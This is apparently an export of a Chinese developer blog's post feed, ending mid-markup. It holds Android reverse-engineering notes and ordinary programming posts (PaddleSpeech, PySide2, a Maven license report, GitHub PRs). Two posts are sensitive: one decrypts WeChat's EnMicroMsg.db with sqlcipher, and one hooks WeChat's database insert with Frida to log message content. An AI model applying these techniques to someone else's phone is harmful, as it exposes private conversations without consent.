<h1 id="拉取数据库到本地"><a href="#拉取数据库到本地" class="headerlink" title="拉取数据库到本地"></a>拉取数据库到本地</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb pull /data/user/0/com.tencent.mm/MicroMsg/替换成你自己的字符串/EnMicroMsg.db .</span><br></pre></td></tr></table></figure>
<h1 id="下载-sqlcipher"><a href="#下载-sqlcipher" class="headerlink" title="下载 sqlcipher"></a>下载 sqlcipher</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sqlcipher-shell64.exe EnMicroMsg.db</span><br><span class="line">sqlite&gt; PRAGMA key = &apos;你自己的密钥&apos;;</span><br><span class="line">sqlite&gt; PRAGMA cipher_use_hmac = off;</span><br><span class="line">sqlite&gt; PRAGMA kdf_iter = 4000;</span><br><span class="line">sqlite&gt; PRAGMA cipher_page_size = 1024;</span><br><span class="line">sqlite&gt; PRAGMA cipher_hmac_algorithm = HMAC_SHA1;</span><br><span class="line">sqlite&gt; PRAGMA cipher_kdf_algorithm = PBKDF2_HMAC_SHA1;</span><br><span class="line">sqlite&gt; ATTACH DATABASE &apos;plaintext.db&apos; AS plaintext KEY &apos;&apos;;</span><br><span class="line">sqlite&gt; SELECT sqlcipher_export(&apos;plaintext&apos;);</span><br><span class="line">sqlite&gt; DETACH DATABASE plaintext;</span><br></pre></td></tr></table></figure>
<h1 id="下载DB-Browser-for-SQLite"><a href="#下载DB-Browser-for-SQLite" class="headerlink" title="下载DB Browser for SQLite"></a>下载DB Browser for SQLite</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">选择plaintext.db 就可以看到数据啦</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> frida </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> android </tag>
            
            <tag> frida </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[JavaScript 实现 String format with ${}]]></title>
      <url>/2024/javascript-string-format-1/</url>
      <content type="html"><![CDATA[<p>JavaScript 实现 String format with ${}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function str_format(str, replacements) &#123;</span><br><span class="line">	return str.replace(/\$\&#123;\w+\&#125;/g, function(placeholderWithDelimiters) &#123;</span><br><span class="line">		var placeholderWithoutDelimiters = placeholderWithDelimiters.substring(2, placeholderWithDelimiters.length - 1);</span><br><span class="line">		var stringReplacement = replacements[placeholderWithoutDelimiters] || placeholderWithDelimiters;</span><br><span class="line">		return stringReplacement;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br><span class="line">console.log(str_format(&apos;$&#123;name&#125; is cat&apos;, &#123;name: &apos;tom&apos;&#125;))</span><br><span class="line">console.log(str_format(&apos;$&#123;0&#125; is cat&apos;, [&apos;tom&apos;]))</span><br></pre></td></tr></table></figure>
<a id="more"></a>]]></content>
      
        <categories>
            
            <category> javascript </category>
            
        </categories>
        
        
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[安装PaddleSpeech]]></title>
      <url>/2024/paddlespeech-install-1/</url>
      <content type="html"><![CDATA[<p>安装PaddleSpeech</p>
<h1 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h1><p>python: 3.8.10</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install paddlepaddle==2.4.2</span><br></pre></td></tr></table></figure>
<h1 id="安装PaddleSpeech"><a href="#安装PaddleSpeech" class="headerlink" title="安装PaddleSpeech"></a>安装PaddleSpeech</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone -b r1.2 https://gitee.com/paddlepaddle/PaddleSpeech</span><br><span class="line">cd PaddleSpeech</span><br><span class="line">pip install pytest-runner -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">pip install . -i https://pypi.tuna.tsinghua.edu.cn/simple </span><br><span class="line">pip install uvicorn==0.18.3</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME</span><br><span class="line">wget -P data https://paddlespeech.bj.bcebos.com/Parakeet/tools/nltk_data.tar.gz</span><br><span class="line">tar zxvf data/nltk_data.tar.gz</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cd PaddleSpeech</span><br><span class="line">paddlespeech_server start --config_file ./paddlespeech/server/conf/application.yaml</span><br><span class="line">出现以下输出，表示服务开启成功</span><br><span class="line">INFO:     Started server process [4697]</span><br><span class="line">[2022-07-29 14:19:03] [INFO] [server.py:75] Started server process [4697]</span><br><span class="line">INFO:     Waiting for application startup.</span><br><span class="line">[2022-07-29 14:19:03] [INFO] [on.py:47] Waiting for application startup.</span><br><span class="line">INFO:     Application startup complete.</span><br><span class="line">[2022-07-29 14:19:03] [INFO] [on.py:61] Application startup complete.</span><br><span class="line">INFO:     Uvicorn running on http://0.0.0.0:8090 (Press CTRL+C to quit)</span><br><span class="line">[2022-07-29 14:19:03] [INFO] [server.py:212] Uvicorn running on http://0.0.0.0:8090 (Press CTRL+C to quit)</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> paddlespeech </tag>
            
            <tag> paddle </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PySide2 播放视频]]></title>
      <url>/2024/pyside2-player-video-1/</url>
      <content type="html"><![CDATA[<p>PySide2播放视频【代码】<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import traceback</span><br><span class="line">from PySide2.QtCore import *</span><br><span class="line">from PySide2.QtGui import *</span><br><span class="line">from PySide2.QtWidgets import *</span><br><span class="line">import home_ui</span><br><span class="line">import cv2</span><br><span class="line">print(&apos;os:&apos;, sys.platform)</span><br><span class="line">if sys.platform.lower().startswith(&apos;linux&apos;):</span><br><span class="line">    os.environ.pop(&quot;QT_QPA_PLATFORM_PLUGIN_PATH&quot;)</span><br><span class="line">class HomeWindow(QMainWindow):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        super(HomeWindow, self).__init__()</span><br><span class="line">        self.ui = home_ui.Ui_MainWindow()</span><br><span class="line">        self.ui.setupUi(self)</span><br><span class="line">        self.frame_timer = QTimer()</span><br><span class="line">        self.video_capture = cv2.VideoCapture(&apos;a.mp4&apos;)</span><br><span class="line">        self.fps = self.video_capture.get(cv2.CAP_PROP_FPS)</span><br><span class="line">        self.frame_timer.timeout.connect(self.display_video_stream)</span><br><span class="line">        self.frame_timer.start(int(1000 // self.fps))</span><br><span class="line">    def display_video_stream(self):</span><br><span class="line">        display_with = self.ui.label_video.width()</span><br><span class="line">        display_height = self.ui.label_video.height()</span><br><span class="line">        try:</span><br><span class="line">            ret, cv_img = self.video_capture.read()</span><br><span class="line">            if not ret:</span><br><span class="line">                return False</span><br><span class="line">            rgb_image = cv2.cvtColor(cv_img, cv2.COLOR_BGR2RGB)</span><br><span class="line">            h, w, ch = rgb_image.shape</span><br><span class="line">            bytes_per_line = ch * w</span><br><span class="line">            convert_to_qt_format = QImage(rgb_image.data, w, h, bytes_per_line, QImage.Format_RGB888)</span><br><span class="line">            p = convert_to_qt_format.scaled(display_with, display_height, Qt.KeepAspectRatio)</span><br><span class="line">            self.ui.label_video.setPixmap(QPixmap.fromImage(p))</span><br><span class="line">        except:</span><br><span class="line">            print(f&apos;&#123;traceback.format_exc()&#125;&apos;)</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    window = HomeWindow()</span><br><span class="line">    window.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python </tag>
            
            <tag> pyqt5 </tag>
            
            <tag> pyside2 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[如何检查项目中用到的License]]></title>
      <url>/2023/how-to-check-project-license-1/</url>
      <content type="html"><![CDATA[<p>如何检查项目中用到的License</p>
<p>检查项目中用到的License</p>
<p>添加依赖<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.jsoup&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;jsoup&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;1.11.3&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-lang3&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;3.12.0&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure></p>
<a id="more"></a>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">执行命令生成依赖报告</span><br><span class="line">./mvnw project-info-reports:dependencies</span><br></pre></td></tr></table></figure>
<p>直接上代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">package jsbxyyx;</span><br><span class="line">import org.apache.commons.lang3.StringUtils;</span><br><span class="line">import org.jsoup.Jsoup;</span><br><span class="line">import org.jsoup.nodes.Element;</span><br><span class="line">import org.jsoup.select.Elements;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.File;</span><br><span class="line">import java.nio.charset.StandardCharsets;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.util.List;</span><br><span class="line">import java.util.Map;</span><br><span class="line">import java.util.TreeMap;</span><br><span class="line">import java.util.concurrent.atomic.AtomicInteger;</span><br><span class="line">public class Tree &#123;</span><br><span class="line">    // ./mvnw project-info-reports:dependencies</span><br><span class="line">    static Map&lt;String, String&gt; map = new TreeMap&lt;&gt;();</span><br><span class="line">    static AtomicInteger counter = new AtomicInteger();</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        String base = System.getProperty(&quot;user.dir&quot;);</span><br><span class="line">        File file = new File(base);</span><br><span class="line">        recursion(file);</span><br><span class="line">        System.out.println(&quot;counter:&quot; + counter.get());</span><br><span class="line">        String outFile = &quot;l.txt&quot;;</span><br><span class="line">        ByteArrayOutputStream out = new ByteArrayOutputStream();</span><br><span class="line">        for (Map.Entry&lt;String, String&gt; entry : map.entrySet()) &#123;</span><br><span class="line">            String key = entry.getKey();</span><br><span class="line">            String value = entry.getValue();</span><br><span class="line">            String[] ss = StringUtils.split(key, &quot;$&quot;);</span><br><span class="line">            out.write((ss[0] + &quot; | &quot; + value + &quot; | &quot; + ss[1] + &quot;\n&quot;).getBytes(StandardCharsets.UTF_8));</span><br><span class="line">        &#125;</span><br><span class="line">        Files.write(new File(base + &quot;/&quot; + outFile).toPath(), out.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">    static void recursion(File f) throws Exception &#123;</span><br><span class="line">        if (f.isDirectory()) &#123;</span><br><span class="line">            File[] files = f.listFiles();</span><br><span class="line">            if (files != null &amp;&amp; files.length &gt; 0) &#123;</span><br><span class="line">                for (File file : files) &#123;</span><br><span class="line">                    recursion(file);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else if (f.getName().equals(&quot;dependencies.html&quot;)) &#123;</span><br><span class="line">            byte[] bytes = Files.readAllBytes(f.toPath());</span><br><span class="line">            Elements table_el = Jsoup.parse(new String(bytes, StandardCharsets.UTF_8)).getElementsByTag(&quot;table&quot;);</span><br><span class="line">            for (Element table : table_el) &#123;</span><br><span class="line">                Elements ths = table.getElementsByTag(&quot;th&quot;);</span><br><span class="line">                boolean has_license = false;</span><br><span class="line">                int index_license = 0;</span><br><span class="line">                for (Element th : ths) &#123;</span><br><span class="line">                    String text = th.text().trim();</span><br><span class="line">                    if (text.equalsIgnoreCase(&quot;Licenses&quot;)) &#123;</span><br><span class="line">                        has_license = true;</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                    index_license++;</span><br><span class="line">                &#125;</span><br><span class="line">                if (has_license) &#123;</span><br><span class="line">                    Elements trs = table.getElementsByTag(&quot;tr&quot;);</span><br><span class="line">                    System.out.println(&quot;file:&quot; + f.getAbsolutePath());</span><br><span class="line">                    for (int i = 1; i &lt; trs.size(); i++) &#123;</span><br><span class="line">                        Element tr = trs.get(i);</span><br><span class="line">                        String groupId = tr.getElementsByTag(&quot;td&quot;).get(0).text().trim();</span><br><span class="line">                        String artifactId = tr.getElementsByTag(&quot;td&quot;).get(1).text().trim();</span><br><span class="line">                        String version = tr.getElementsByTag(&quot;td&quot;).get(2).text().trim();</span><br><span class="line">                        String type = tr.getElementsByTag(&quot;td&quot;).get(index_license - 1).text().trim();</span><br><span class="line">                        Element td_license = tr.getElementsByTag(&quot;td&quot;).get(index_license);</span><br><span class="line">                        Elements td_license_a = td_license.getElementsByTag(&quot;a&quot;);</span><br><span class="line">                        List&lt;String&gt; licenseList = td_license_a.eachText();</span><br><span class="line">                        String licenses = td_license_a.isEmpty() ?</span><br><span class="line">                                td_license.text().trim() :</span><br><span class="line">                                StringUtils.joinWith(&quot; # &quot;, licenseList.toArray(new String[0]));</span><br><span class="line">                        System.out.println(groupId + &quot;:&quot; + artifactId + &quot; | &quot; + licenses + &quot; | &quot; + version);</span><br><span class="line">                        map.put(groupId + &quot;:&quot; + artifactId + &quot;$&quot; + version, licenses);</span><br><span class="line">                    &#125;</span><br><span class="line">                    counter.incrementAndGet();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> license </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Github贡献PR六部曲]]></title>
      <url>/2023/github-pull-request-step-1/</url>
      <content type="html"><![CDATA[<p>Github贡献PR六部曲</p>
<h1 id="1-fork代码"><a href="#1-fork代码" class="headerlink" title="1. fork代码"></a>1. fork代码</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">选中自己要贡献PR的仓库，点击Github右上角的fork</span><br></pre></td></tr></table></figure>
<h1 id="2-clone代码"><a href="#2-clone代码" class="headerlink" title="2. clone代码"></a>2. clone代码</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:&#123;username&#125;/seata.git</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="3-设置提交信息"><a href="#3-设置提交信息" class="headerlink" title="3. 设置提交信息"></a>3. 设置提交信息</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git config user.name &#123;username&#125;</span><br><span class="line">git config user.email &#123;email&#125;</span><br><span class="line">git remote add upstream git@github.com:seata/seata.git</span><br><span class="line">git remote set-url --push upstream no-pushing</span><br></pre></td></tr></table></figure>
<h1 id="4-贡献PR步骤"><a href="#4-贡献PR步骤" class="headerlink" title="4. 贡献PR步骤"></a>4. 贡献PR步骤</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git checkout remotes/upstream/develop -b &#123;branch name&#125;</span><br><span class="line">git push origin &#123;branch name&#125;</span><br><span class="line">git branch --set-upstream-to=origin/&#123;branch name&#125; &#123;branch name&#125;</span><br></pre></td></tr></table></figure>
<h1 id="5-提交PR"><a href="#5-提交PR" class="headerlink" title="5. 提交PR"></a>5. 提交PR</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">写完代码后，打开github，点击pull request</span><br><span class="line">选择你要合并的分支 base</span><br><span class="line">按照仓库要求填写标题，内容</span><br><span class="line">最后点击Create Pull Request</span><br></pre></td></tr></table></figure>
<h1 id="6-bug修复"><a href="#6-bug修复" class="headerlink" title="6. bug修复"></a>6. bug修复</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当有bug时，直接在自己的分支上修改，然后push就好了，直到bug解决完毕，代码被合并后，可以在github上点击Delete branch</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> github </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[frida安装与配置]]></title>
      <url>/2023/frida-install-config-1/</url>
      <content type="html"><![CDATA[<p>frida安装与配置</p>
<h1 id="下载夜神模拟器-x86-64"><a href="#下载夜神模拟器-x86-64" class="headerlink" title="下载夜神模拟器 x86_64"></a>下载夜神模拟器 x86_64</h1><h1 id="下载python-3-8-x"><a href="#下载python-3-8-x" class="headerlink" title="下载python 3.8.x"></a>下载python 3.8.x</h1><h1 id="下载-frida-server"><a href="#下载-frida-server" class="headerlink" title="下载 frida-server"></a>下载 frida-server</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/frida/frida/releases/download/12.8.0/frida-server-12.8.0-android-x86_64.xz</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unxz frida-server-12.8.0-android-x86_64.xz</span><br></pre></td></tr></table></figure>
<h1 id="下载frida-gadget"><a href="#下载frida-gadget" class="headerlink" title="下载frida-gadget"></a>下载frida-gadget</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/frida/frida/releases/download/12.8.0/frida-gadget-12.8.0-android-x86_64.so.xz</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unxz frida-gadget-12.8.0-android-x86_64.so.xz</span><br><span class="line">mkdir -p ~/.cache/frida</span><br><span class="line">cp -rp frida-gadget-12.8.0-android-x86_64.so ~/.cache/frida/gadget-android-arm64.so</span><br></pre></td></tr></table></figure>
<h1 id="安装frida"><a href="#安装frida" class="headerlink" title="安装frida"></a>安装frida</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install frida==12.8.0</span><br><span class="line">pip3 install frida-tools==5.3.0</span><br></pre></td></tr></table></figure>
<h1 id="启动frida-server"><a href="#启动frida-server" class="headerlink" title="启动frida-server"></a>启动frida-server</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">adb root</span><br><span class="line">adb remount</span><br><span class="line">adb push frida-server-12.8.0-android-x86_64 /data/local/tmp/frida-server</span><br><span class="line">adb shell</span><br><span class="line">cd /data/local/tmp</span><br><span class="line">./frida-server</span><br></pre></td></tr></table></figure>
<h1 id="测试frida"><a href="#测试frida" class="headerlink" title="测试frida"></a>测试frida</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -U</span><br><span class="line">test.js</span><br><span class="line">console.log(&apos;script loaded successfully&apos;);</span><br><span class="line">Java.perform(function x() &#123;</span><br><span class="line">	console.log(&apos;test&apos;);</span><br><span class="line">&#125;);</span><br><span class="line">frida -U -l ./test.js com.tencent.mm</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> frida </category>
            
        </categories>
        
        
        <tags>
            
            <tag> frida </tag>
            
            <tag> python </tag>
            
            <tag> javascript </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Frida获取微信消息内容]]></title>
      <url>/2023/frida-wechat-get-msg-1/</url>
      <content type="html"><![CDATA[<p>Frida获取微信消息内容</p>
<h1 id="上一篇讲解了如何安装Frida"><a href="#上一篇讲解了如何安装Frida" class="headerlink" title="上一篇讲解了如何安装Frida"></a>上一篇讲解了如何安装Frida</h1><h1 id="获取微信消息内容"><a href="#获取微信消息内容" class="headerlink" title="获取微信消息内容"></a>获取微信消息内容</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var SQLiteDatabase = Java.use(&quot;com.tencent.wcdb.database.SQLiteDatabase&quot;);</span><br><span class="line">SQLiteDatabase[&quot;insert&quot;].implementation = function (str, str2, contentValues) &#123;</span><br><span class="line">    console.log(&apos;SQLiteDatabase.insert is called:&apos;, &apos;str=&apos;, str, &apos;str2=&apos;, str2, &apos;contentValues=&apos;, contentValues);</span><br><span class="line">    var result = this[&quot;insert&quot;](str, str2, contentValues);</span><br><span class="line">    console.log(&apos;SQLiteDatabase.insert result=&apos;, result);</span><br><span class="line">    return result;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>str: 消息类型</p>
<ul>
<li>message: 普通消息 AppMessage: 小程序消息</li>
</ul>
<p>contentValues: sql参数键值对 </p>
<ul>
<li>content: 消息内容</li>
</ul>
]]></content>
      
        <categories>
            
            <category> frida </category>
            
        </categories>
        
        
        <tags>
            
            <tag> frida </tag>
            
            <tag> python </tag>
            
            <tag> javascript </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Android Studio搭建Xposed项目]]></title>
      <url>/2023/as-xposed-1/</url>
      <content type="html"><![CDATA[<h1 id="添加依赖"><a href="#添加依赖" class="headerlink" title="添加依赖"></a>添加依赖</h1><p>settings.gradle<br>在dependencyResolutionManagement添加<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">dependencyResolutionManagement &#123;</span><br><span class="line">    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)</span><br><span class="line">    repositories &#123;</span><br><span class="line">        google()</span><br><span class="line">        mavenCentral()</span><br><span class="line">		// **</span><br><span class="line">        maven &#123; url &apos;https://maven.aliyun.com/nexus/content/groups/public/&apos; &#125;</span><br><span class="line">        maven &#123; url &apos;https://maven.aliyun.com/nexus/content/repositories/jcenter&apos; &#125;</span><br><span class="line">        maven &#123; url &apos;https://maven.aliyun.com/nexus/content/repositories/google&apos; &#125;</span><br><span class="line">        maven &#123; url &apos;https://maven.aliyun.com/nexus/content/repositories/gradle-plugin&apos; &#125;</span><br><span class="line">        maven &#123; url &apos;https://api.xposed.info/&apos; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>app:build.gradle<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dependencies &#123;</span><br><span class="line">  ...</span><br><span class="line">  // **</span><br><span class="line">  compileOnly &apos;de.robv.android.xposed:api:82&apos;</span><br><span class="line">  compileOnly &apos;de.robv.android.xposed:api:82:sources&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h1><p>AndroidManifest.xml在application标签中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;application ...&gt;</span><br><span class="line">...</span><br><span class="line">&lt;!-- ** --&gt;</span><br><span class="line">&lt;meta-data</span><br><span class="line">            android:name=&quot;xposedmodule&quot;</span><br><span class="line">            android:value=&quot;true&quot; /&gt;</span><br><span class="line">&lt;meta-data</span><br><span class="line">            android:name=&quot;xposeddescription&quot;</span><br><span class="line">            android:value=&quot;xposed desc&quot; /&gt;</span><br><span class="line">&lt;meta-data</span><br><span class="line">            android:name=&quot;xposedminversion&quot;</span><br><span class="line">            android:value=&quot;82&quot; /&gt;</span><br><span 